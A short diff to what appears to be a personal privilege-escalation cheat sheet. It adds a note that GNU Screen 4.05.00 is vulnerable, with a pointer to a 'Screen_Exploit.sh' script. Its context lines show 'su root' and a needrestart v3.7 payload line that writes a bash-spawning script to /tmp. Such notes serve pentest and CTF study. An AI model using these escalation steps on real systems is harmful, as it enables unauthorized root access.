@@ -91,6 +91,15 @@ su root
 
 ```
 
+
+##Vulnerable Services
+```
+screen -v
+Screen version 4.05.00 (GNU) 10-Dec-16
+Privilege Escalation - Screen_Exploit.sh
+
+```
+
 ##needrestart v3.7
 ```
 echo 'system("/bin/bash");' > /tmp/root.sh
